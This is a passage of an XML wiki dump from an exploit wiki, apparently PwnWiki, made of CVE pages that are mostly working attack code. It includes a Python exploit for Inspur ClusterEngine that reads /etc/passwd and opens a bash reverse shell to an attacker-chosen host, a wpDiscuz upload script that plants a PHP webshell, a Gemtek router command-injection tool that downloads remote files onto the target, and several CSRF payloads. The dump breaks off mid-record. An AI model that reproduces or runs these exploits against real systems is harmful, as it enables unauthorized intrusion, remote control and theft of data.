import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 浪潮ClusterEngineV4.0                                     \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mIP          &gt;&gt;&gt; xxx.xxx.xxx.xxx:9999                              \033[0m')
    print('+  \033[36mPORT        &gt;&gt;&gt; 9999                                              \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    data = "op=login&amp;username=test`$(cat /etc/passwd)`"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4)
        etc_passwd = re.findall(r'\{"err":"/bin/sh: (.*?): No such', response.text)
        if response.status_code == 200 and "root:x:0:0" in response.text:
            print("\033[32m[o]    目标 {} 可能存在漏洞, 响应为:{} \033[0m".format(target_url, etc_passwd[0]))
            POC_2(target_url)
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

def POC_2(target_url):
    IP = str(input("\033[35m请输入监听IP   &gt;&gt;&gt; \033[0m"))
    PORT = str(input("\033[35m请输入监听PORT &gt;&gt;&gt; \033[0m"))
    vuln_url = target_url + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    data = "op=login&amp;username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`".format(IP, PORT)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False)
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

==参考==
https://short.pwnwiki.org/?c=aLBsJw</text>
      <sha1>27lul3slwvy7ddj2hkz1d5514l57x49</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-21585 Emlog v6.0.0 ZIP插件Getshell</title>
    <ns>0</ns>
    <id>2546</id>
    <revision>
      <id>3043</id>
      <timestamp>2021-05-22T02:36:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用== &lt;pre&gt; http://x.x.x.x/emlog/src/admin/plugin.php 編輯一個ZIP包，包含xx/xx.php 访问之：http://127.0.0.1/emlog/src/content/plugins/abc/abc.php &lt;/pre&gt;"</comment>
      <origin>3043</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="175" sha1="ntn23sqe57xaaq1ym2h2huoxybdapkk" xml:space="preserve">==漏洞利用==
&lt;pre&gt;
http://x.x.x.x/emlog/src/admin/plugin.php
編輯一個ZIP包，包含xx/xx.php
访问之：http://127.0.0.1/emlog/src/content/plugins/abc/abc.php
&lt;/pre&gt;</text>
      <sha1>ntn23sqe57xaaq1ym2h2huoxybdapkk</sha1>
    </revision>
    <revision>
      <id>3044</id>
      <parentid>3043</parentid>
      <timestamp>2021-05-22T02:36:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>3044</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="164" sha1="jdjd8ircpuhdo0q2euln7nyvqekhgxi" xml:space="preserve">==漏洞利用==
&lt;pre&gt;
http://x.x.x.x/emlog/src/admin/plugin.php
編輯一個ZIP包，包含xx/xx.php

http://127.0.0.1/emlog/src/content/plugins/abc/abc.php
&lt;/pre&gt;</text>
      <sha1>jdjd8ircpuhdo0q2euln7nyvqekhgxi</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-23342 Anchor CMS 0.12.7 跨站請求僞造漏洞</title>
    <ns>0</ns>
    <id>2733</id>
    <revision>
      <id>3232</id>
      <timestamp>2021-05-23T04:59:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; "Anchor CMS" &amp;&amp; body="themes/default/img/favicon.png" &lt;/pre&gt;  ==POC== Anchor CMS使用Get方法進行敏感操作，可以使用exploit.html進行刪除用戶..."</comment>
      <origin>3232</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="325" sha1="1y1gyqssus89v1flvafrttzl0cytvmw" xml:space="preserve">==FOFA==
&lt;pre&gt;
"Anchor CMS" &amp;&amp; body="themes/default/img/favicon.png"
&lt;/pre&gt;

==POC==
Anchor CMS使用Get方法進行敏感操作，可以使用exploit.html進行刪除用戶等操作。

exploit.html
&lt;pre&gt;
&lt;img src="http://target/anchor/index.php/admin/users/delete/21"&gt;
&lt;/pre&gt;

當管理員點擊時刪除ID為21的用戶。</text>
      <sha1>1y1gyqssus89v1flvafrttzl0cytvmw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-23522 Pixelimity 1.0 跨站請求偽造漏洞</title>
    <ns>0</ns>
    <id>3219</id>
    <revision>
      <id>3756</id>
      <timestamp>2021-05-31T03:54:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Pixelimity 1.0 - 'password' Cross-Site Request Forgery # Date: 2020-06-03 # Exploit Author: Noth # Vendor Homepage: https://github.com/pixelimity/pixeli..."</comment>
      <origin>3756</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1374" sha1="897ird4p9oycbfmnk124r9hnjjlqzi4" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Pixelimity 1.0 - 'password' Cross-Site Request Forgery
# Date: 2020-06-03
# Exploit Author: Noth
# Vendor Homepage: https://github.com/pixelimity/pixelimity
# Software Link: https://github.com/pixelimity/pixelimity
# Version: v1.0
# CVE : 2020-23522

Pixelimity 1.0 has cross-site request forgery via the admin/setting.php data [Password] parameter.

PoC :

&lt;html&gt;
&lt;body&gt;
&lt;script&gt;history.pushState(",",'/')&lt;/script&gt;
&lt;form action=“http://127.0.0.1/pixelimity-dev/admin/setting.php
” method=“POST”&gt;
&lt;input type=“hidden” name=“submit_setting” value=“Save Setting”/&gt;
&lt;input type=“hidden” name=“data[admin_portfolio_show]”
value=“5”/&gt;
&lt;input type=“hidden” name=“data[admin_pages_show]”
value=“5”/&gt;
&lt;input type=“hidden” name=“admin[data_password]”
value=“456789”/&gt;
&lt;input type=“hidden” name=“data[site#95;name]"
value=“Pixelimity”/&gt;
&lt;input type=“hidden” name=“data[site_name]show]”
value=“My Online Portfolio”/&gt;
&lt;input type=“hidden” name=“data[home_image_size&amp;#93” value=“5”/&gt;
&lt;input type=“hidden” name=“ data[single_image_image_size#93
” value=“ 240&amp;44;0,0&amp;44;auto ”/&gt;
&lt;input type=“hidden” name=“data[single_image_image_size#93”
value=“720&amp;44;0,0&amp;44;auto”/&gt;
&lt;input type=“submit” value=“Submit request”/&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;</text>
      <sha1>897ird4p9oycbfmnk124r9hnjjlqzi4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24186 Wordpress Plugin wpDiscuz 7.0.4 文件寫入漏洞</title>
    <ns>0</ns>
    <id>3644</id>
    <revision>
      <id>4229</id>
      <timestamp>2021-06-07T12:08:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated) # Google Dork: inurl:/wp-content/plugins/wpdiscuz/ # Date: 2021-06-06..."</comment>
      <origin>4229</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2519" sha1="73txeoiorcvk9d4c6s059mjjpevsfkg" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)
# Google Dork: inurl:/wp-content/plugins/wpdiscuz/
# Date: 2021-06-06
# Original Author: Chloe Chamberland 
# Exploit Author: Juampa Rodríguez aka UnD3sc0n0c1d0
# Vendor Homepage: https://gvectors.com/
# Software Link: https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip
# Version: 7.0.4
# Tested on: Ubuntu / WordPress 5.6.2
# CVE : CVE-2020-24186

#!/bin/bash

if [ -z $1 ]
then
  echo -e "\n[i] Usage: exploit.sh [IP] [/index.php/2021/06/06/post]\n"
  exit 0
elif [ -z $2 ]
then
  echo -e "\n[i] Usage: exploit.sh [IP] [/index.php/2021/06/06/post]\n"
  exit 0
else

post=$(curl -sI http://$1$2/ | head -n1)

if [[ "$post" == *"200 OK"* ]]; then
    wmu_nonce=$(curl -s http://$1$2/ | sed -r "s/wmuSecurity/\nwmuSecurity/g" | grep wmuSecurity | cut -d '"' -f3)
    webshell=$(curl -isk -X 'POST' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: multipart/form-data; boundary=---------------------------WebKitFormBoundaryUnD3s' --data-binary $'-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"action\"\x0d\x0a\x0d\x0awmuUploadFiles\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"wmu_nonce\"\x0d\x0a\x0d\x0a'$wmu_nonce$'\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"wmuAttachmentsData\"\x0d\x0a\x0d\x0aundefined\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"wmu_files[0]\"; filename=\"a.php\" Content-Type: image/jpeg\x0d\x0a\x0d\x0aGIF8\x0d\x0a&lt;?php\x0d\x0aif(isset($_REQUEST[\'cmd\'])){\x0d\x0a        $cmd = ($_REQUEST[\'cmd\']);\x0d\x0a        system($cmd);\x0d\x0a        die;\x0d\x0a}\x0d\x0a?&gt;\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"postId\"\x0d\x0a\x0d\x0a18\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s--\x0d\x0a' http://$1/wp-admin/admin-ajax.php | sed 's/\":"\http/\nhttp/g' | grep "http\:\\\\/" | cut -d '"' -f1 | sed 's/\\//g')

    echo -e "\nWebshell:" $webshell"\n"
    echo -e "--------------WIN--------------"
    echo -e "        ¡Got  webshell!        "
    echo -e "-------------------------------\n"
    while :
    do
	read -p '$ ' command
	curl -s $webshell?cmd=$command | grep -v GIF8
done
else
    echo -e "\n[!] The indicated post was not found\n"
fi
fi
&lt;/pre&gt;</text>
      <sha1>73txeoiorcvk9d4c6s059mjjpevsfkg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24365 Gemtek WVRTM-127ACN 01.01.02.141 經過認證的命令注入漏洞</title>
    <ns>0</ns>
    <id>4342</id>
    <revision>
      <id>4991</id>
      <timestamp>2021-06-13T01:51:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Version: 01.01.02.127, 01.01.02.141 &lt;/pre&gt;  ==EXP== &lt;pre&gt; # Exploit Title: Gemtek WVRTM-127ACN 01.01.02.141 - Aut..."</comment>
      <origin>4991</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4779" sha1="qpl0h43mgd63dygnrmal7zcnj7cvi64" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Version: 01.01.02.127, 01.01.02.141
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Gemtek WVRTM-127ACN 01.01.02.141 - Authenticated Arbitrary Command Injection 
# Date: 13/09/2020                                         
# Exploit Author: Gabriele Zuddas                         
# Version: 01.01.02.127, 01.01.02.141                      
# CVE : CVE-2020-24365                                     


Service Provider : 	Linkem
Product Name : 	LTE CPE
Model ID : 	WVRTM-127ACN
Serial ID :	GMK170418011089
IMEI : 	XXXXXXXXXXXXX
ICCID : 	XXXXXXXXXXXXXXXXXX
Firmware Version : 	01.01.02.141
Firmware Creation Date : 	May 15 13:04:30 CST 2019
Bootrom Version : 	U-Boot 1.1.3
Bootrom Creation Date : 	Oct 23 2015 - 16:03:05
LTE Support Band : 	42,43


Injecting happens here:

sh -c (ping -4 -c 1 -s 4 -W 1 "INJECTION" &gt; /tmp/mon_diag.log 2&gt;&amp;1; cmscfg -s -n mon_diag_status -v 0)&amp;


Exploit has been tested on older verions too:
    Firmware Version: 	01.01.02.127
    Firmware Creation Date : 	May 23 15:34:10 CST 2018

"""

import requests, time, argparse, re, sys

class Exploit():
    
    CVE = "CVE-2020-24365"
    
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
    
    def login(self):
        s = self.session
        r = s.post(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=login.asp&amp;action=login", data={"user_name":self.args.username,"user_passwd":self.args.password})
        if "sid" not in s.cookies:
            print("[!] Login failed.")
            exit(1)
        sid = s.cookies["sid"]
        s.headers = {"sid": sid}
        print(f"[*] Login successful! (sid={sid})")
    
    def now(self):
        return int(time.time() * 1000)

    def exploit(self, command):
        self.login()
        
        with self.session as s:
            payload = f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=save_monitor_diagnostic&amp;mon_diag_type=0&amp;mon_diag_addr=$({command};)&amp;mon_ping_num=1&amp;mon_ping_size=4&amp;mon_ping_timeout=1&amp;mon_tracert_hops=&amp;mon_diag_protocol_type=4&amp;time={self.now()}&amp;_={self.now()}"
            
            r = s.get(payload)
            r = s.get(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=diagnostic_tools_start&amp;notrun=1&amp;time={self.now()}&amp;_={self.now()}")
            content = str(r.content, "utf8")

            #Attempt to stop the command as some commands tend to get stuck (if commands stop working check on the web interface)
            r = s.get(payload)
            r = s.get(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=diagnostic_tools_start&amp;notrun=1&amp;time={self.now()}&amp;_={self.now()}")
            content = str(r.content, "utf8")
            
            #TODO: eventually parse content with regex to clean out the output
            c = re.findall(r"(?&lt;=ping: bad address \')(.*)(?=\')", content)
            print(content)
            print(c[0])
            
            if len(c) &gt; 0:
                return c[0]
            else:
                return False

    def download_file(self, url):
        filename = url.rsplit('/', 1)[-1]
        
        if self.args.file is not None:
            print(f"[*] Attempting download of file '{filename}' from {url} ...")
    
            if self.exploit(f"wget {url} -O /tmp/{filename}"):
                print(f"[*] File saved on {self.args.target}'s /tmp/{filename}.")
                print(self.exploit(f"du -h /tmp/{filename}"))
                return True
            else:
                print(f"[!] Failed to download {filename} from {url}")
                return False

    def run(self):
        if self.args.command is not None:
            print(self.exploit(self.args.command))
            exit()
        if self.args.file is not None:
            self.download_file(self.args.file)
            exit()

if __name__ == "__main__":
    # Create the parser and add arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", default="192.168.1.1", help="Vulnerable target")
    parser.add_argument("-u", "--username", dest="username", default="admin", help="Valid username to use")
    parser.add_argument("-p", "--password", dest="password", default="admin", help="Valid password to use")
    parser.add_argument("-c", "--command", dest="command", default=None, help="Command to execute")
    
    parser.add_argument("-D", "--download-file", dest="file", default=None, help="Download file on target's /tmp directory")

    args = parser.parse_args()

    # Run exploit
    X = Exploit(args)
    if len(sys.argv) &gt; 1:
        print(f"[*] Exploiting {X.CVE} ...")
        X.run()
    else:
        parser.print_help(sys.stderr)
            
&lt;/pre&gt;</text>
      <sha1>qpl0h43mgd63dygnrmal7zcnj7cvi64</sha1>
    </revision>
    <revision>
      <id>4993</id>
      <parentid>4991</parentid>
      <timestamp>2021-06-13T01:51:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4993</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4790" sha1="nvlwmbk3rl5wr2hs068faw4nvraj8du" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Version: 01.01.02.127, 01.01.02.141
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Gemtek WVRTM-127ACN 01.01.02.141 - Authenticated Arbitrary Command Injection 
# Date: 13/09/2020                                         
# Exploit Author: Gabriele Zuddas                         
# Version: 01.01.02.127, 01.01.02.141                      
# CVE : CVE-2020-24365                                     


Service Provider : 	Linkem
Product Name : 	LTE CPE
Model ID : 	WVRTM-127ACN
Serial ID :	GMK170418011089
IMEI : 	XXXXXXXXXXXXX
ICCID : 	XXXXXXXXXXXXXXXXXX
Firmware Version : 	01.01.02.141
Firmware Creation Date : 	May 15 13:04:30 CST 2019
Bootrom Version : 	U-Boot 1.1.3
Bootrom Creation Date : 	Oct 23 2015 - 16:03:05
LTE Support Band : 	42,43


Injecting happens here:

sh -c (ping -4 -c 1 -s 4 -W 1 "INJECTION" &gt; /tmp/mon_diag.log 2&gt;&amp;1; cmscfg -s -n mon_diag_status -v 0)&amp;


Exploit has been tested on older verions too:
    Firmware Version: 	01.01.02.127
    Firmware Creation Date : 	May 23 15:34:10 CST 2018

"""

import requests, time, argparse, re, sys

class Exploit():
    
    CVE = "CVE-2020-24365"
    
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
    
    def login(self):
        s = self.session
        r = s.post(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=login.asp&amp;action=login", data={"user_name":self.args.username,"user_passwd":self.args.password})
        if "sid" not in s.cookies:
            print("[!] Login failed.")
            exit(1)
        sid = s.cookies["sid"]
        s.headers = {"sid": sid}
        print(f"[*] Login successful! (sid={sid})")
    
    def now(self):
        return int(time.time() * 1000)

    def exploit(self, command):
        self.login()
        
        with self.session as s:
            payload = f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=save_monitor_diagnostic&amp;mon_diag_type=0&amp;mon_diag_addr=$({command};)&amp;mon_ping_num=1&amp;mon_ping_size=4&amp;mon_ping_timeout=1&amp;mon_tracert_hops=&amp;mon_diag_protocol_type=4&amp;time={self.now()}&amp;_={self.now()}"
            
            r = s.get(payload)
            r = s.get(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=diagnostic_tools_start&amp;notrun=1&amp;time={self.now()}&amp;_={self.now()}")
            content = str(r.content, "utf8")

            #Attempt to stop the command as some commands tend to get stuck (if commands stop working check on the web interface)
            r = s.get(payload)
            r = s.get(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=diagnostic_tools_start&amp;notrun=1&amp;time={self.now()}&amp;_={self.now()}")
            content = str(r.content, "utf8")
            
            #TODO: eventually parse content with regex to clean out the output
            c = re.findall(r"(?&lt;=ping: bad address \')(.*)(?=\')", content)
            print(content)
            print(c[0])
            
            if len(c) &gt; 0:
                return c[0]
            else:
                return False

    def download_file(self, url):
        filename = url.rsplit('/', 1)[-1]
        
        if self.args.file is not None:
            print(f"[*] Attempting download of file '{filename}' from {url} ...")
    
            if self.exploit(f"wget {url} -O /tmp/{filename}"):
                print(f"[*] File saved on {self.args.target}'s /tmp/{filename}.")
                print(self.exploit(f"du -h /tmp/{filename}"))
                return True
            else:
                print(f"[!] Failed to download {filename} from {url}")
                return False

    def run(self):
        if self.args.command is not None:
            print(self.exploit(self.args.command))
            exit()
        if self.args.file is not None:
            self.download_file(self.args.file)
            exit()

if __name__ == "__main__":
    # Create the parser and add arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", default="192.168.1.1", help="Vulnerable target")
    parser.add_argument("-u", "--username", dest="username", default="admin", help="Valid username to use")
    parser.add_argument("-p", "--password", dest="password", default="admin", help="Valid password to use")
    parser.add_argument("-c", "--command", dest="command", default=None, help="Command to execute")
    
    parser.add_argument("-D", "--download-file", dest="file", default=None, help="Download file on target's /tmp directory")

    args = parser.parse_args()

    # Run exploit
    X = Exploit(args)
    if len(sys.argv) &gt; 1:
        print(f"[*] Exploiting {X.CVE} ...")
        X.run()
    else:
        parser.print_help(sys.stderr)
            
&lt;/pre&gt;</text>
      <sha1>nvlwmbk3rl5wr2hs068faw4nvraj8du</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24365 Gemtek WVRTM-127ACN 01.01.02.141 經過認證的命令注入漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4348</id>
    <revision>
      <id>4998</id>
      <timestamp>2021-06-13T01:54:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>4998</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4754" sha1="hs4v5dmy2hcfcz7g5fbvg4u930tltpp" xml:space="preserve">&lt;languages /&gt;
==影响版本==
&lt;pre&gt;
Version: 01.01.02.127, 01.01.02.141
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Gemtek WVRTM-127ACN 01.01.02.141 - Authenticated Arbitrary Command Injection 
# Date: 13/09/2020                                         
# Exploit Author: Gabriele Zuddas                         
# Version: 01.01.02.127, 01.01.02.141                      
# CVE : CVE-2020-24365                                     


Service Provider : 	Linkem
Product Name : 	LTE CPE
Model ID : 	WVRTM-127ACN
Serial ID :	GMK170418011089
IMEI : 	XXXXXXXXXXXXX
ICCID : 	XXXXXXXXXXXXXXXXXX
Firmware Version : 	01.01.02.141
Firmware Creation Date : 	May 15 13:04:30 CST 2019
Bootrom Version : 	U-Boot 1.1.3
Bootrom Creation Date : 	Oct 23 2015 - 16:03:05
LTE Support Band : 	42,43


Injecting happens here:

sh -c (ping -4 -c 1 -s 4 -W 1 "INJECTION" &gt; /tmp/mon_diag.log 2&gt;&amp;1; cmscfg -s -n mon_diag_status -v 0)&amp;


Exploit has been tested on older verions too:
    Firmware Version: 	01.01.02.127
    Firmware Creation Date : 	May 23 15:34:10 CST 2018

"""

import requests, time, argparse, re, sys

class Exploit():
    
    CVE = "CVE-2020-24365"
    
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
    
    def login(self):
        s = self.session
        r = s.post(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=login.asp&amp;action=login", data={"user_name":self.args.username,"user_passwd":self.args.password})
        if "sid" not in s.cookies:
            print("[!] Login failed.")
            exit(1)
        sid = s.cookies["sid"]
        s.headers = {"sid": sid}
        print(f"[*] Login successful! (sid={sid})")
    
    def now(self):
        return int(time.time() * 1000)

    def exploit(self, command):
        self.login()
        
        with self.session as s:
            payload = f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=save_monitor_diagnostic&amp;mon_diag_type=0&amp;mon_diag_addr=$({command};)&amp;mon_ping_num=1&amp;mon_ping_size=4&amp;mon_ping_timeout=1&amp;mon_tracert_hops=&amp;mon_diag_protocol_type=4&amp;time={self.now()}&amp;_={self.now()}"
            
            r = s.get(payload)
            r = s.get(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=diagnostic_tools_start&amp;notrun=1&amp;time={self.now()}&amp;_={self.now()}")
            content = str(r.content, "utf8")

            #Attempt to stop the command as some commands tend to get stuck (if commands stop working check on the web interface)
            r = s.get(payload)
            r = s.get(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&amp;action=diagnostic_tools_start&amp;notrun=1&amp;time={self.now()}&amp;_={self.now()}")
            content = str(r.content, "utf8")
            
            #TODO: eventually parse content with regex to clean out the output
            c = re.findall(r"(?&lt;=ping: bad address \')(.*)(?=\')", content)
            print(content)
            print(c[0])
            
            if len(c) &gt; 0:
                return c[0]
            else:
                return False

    def download_file(self, url):
        filename = url.rsplit('/', 1)[-1]
        
        if self.args.file is not None:
            print(f"[*] Attempting download of file '{filename}' from {url} ...")
    
            if self.exploit(f"wget {url} -O /tmp/{filename}"):
                print(f"[*] File saved on {self.args.target}'s /tmp/{filename}.")
                print(self.exploit(f"du -h /tmp/{filename}"))
                return True
            else:
                print(f"[!] Failed to download {filename} from {url}")
                return False

    def run(self):
        if self.args.command is not None:
            print(self.exploit(self.args.command))
            exit()
        if self.args.file is not None:
            self.download_file(self.args.file)
            exit()

if __name__ == "__main__":
    # Create the parser and add arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", default="192.168.1.1", help="Vulnerable target")
    parser.add_argument("-u", "--username", dest="username", default="admin", help="Valid username to use")
    parser.add_argument("-p", "--password", dest="password", default="admin", help="Valid password to use")
    parser.add_argument("-c", "--command", dest="command", default=None, help="Command to execute")
    
    parser.add_argument("-D", "--download-file", dest="file", default=None, help="Download file on target's /tmp directory")

    args = parser.parse_args()

    # Run exploit
    X = Exploit(args)
    if len(sys.argv) &gt; 1:
        print(f"[*] Exploiting {X.CVE} ...")
        X.run()
    else:
        parser.print_help(sys.stderr)
            
&lt;/pre&gt;</text>
      <sha1>hs4v5dmy2hcfcz7g5fbvg4u930tltpp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24581 D-Link DSL-2888A AU 2.31 V1.1.47ae55 RCE漏洞</title>
    <ns>0</ns>
    <id>258</id>
    <revision>
      <id>404</id>
      <timestamp>2021-03-18T09:36:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;   ==POC== &lt;pre&gt; http:/xxx/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&amp;cmd=uname -a &lt;/pre&gt;"</comment>
      <origin>404</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="108" sha1="lsq9s07d7g8hsikr2zchw4sslkkmn36" xml:space="preserve">&lt;languages  /&gt;


==POC==
&lt;pre&gt;
http:/xxx/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&amp;cmd=uname -a
&lt;/pre&gt;</text>
      <sha1>lsq9s07d7g8hsikr2zchw4sslkkmn36</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24739 Icms v7.0.15 CSRF漏洞</title>
    <ns>0</ns>
    <id>5757</id>
    <revision>
      <id>6621</id>
      <timestamp>2021-07-10T06:12:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; https://&lt;target&gt;/work/work1/admincp.php?app=members&amp;do=del&amp;id=3&amp;frame=iPHP&amp;CSRF_TOKEN= &lt;img src="http://url/work/work1/admincp.php?app=members&amp;do=del&amp;id=1&amp;frame=iPHP&amp;CSR..."</comment>
      <origin>6621</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="657" sha1="gopzs5dgcqeifpz69g1wbs27l3n0s8a" xml:space="preserve">&lt;pre&gt;
https://&lt;target&gt;/work/work1/admincp.php?app=members&amp;do=del&amp;id=3&amp;frame=iPHP&amp;CSRF_TOKEN=
&lt;img src="http://url/work/work1/admincp.php?app=members&amp;do=del&amp;id=1&amp;frame=iPHP&amp;CSRF_TOKEN="&gt;
&lt;img src="http://url/work/work1/admincp.php?app=members&amp;do=del&amp;id=2&amp;frame=iPHP&amp;CSRF_TOKEN="&gt;
&lt;img src="http://url/work/work1/admincp.php?app=members&amp;do=del&amp;id=3&amp;frame=iPHP&amp;CSRF_TOKEN="&gt;
&lt;img src="http://url/work/work1/admincp.php?app=members&amp;do=del&amp;id=4&amp;frame=iPHP&amp;CSRF_TOKEN="&gt;
&lt;img src="http://url/work/work1/admincp.php?app=members&amp;do=del&amp;id=5&amp;frame=iPHP&amp;CSRF_TOKEN="&gt;
&lt;img src="http://url/work/work1/admincp.php?app=members&amp;do=del&amp;id=6&amp;frame=iPHP&amp;CSRF_TOKEN="&gt;
&lt;/pre&gt;</text>
      <sha1>gopzs5dgcqeifpz69g1wbs27l3n0s8a</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24877 ZzzPHP Sqli漏洞</title>
    <ns>0</ns>
    <id>270</id>
    <revision>
      <id>420</id>
      <timestamp>2021-03-19T01:18:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
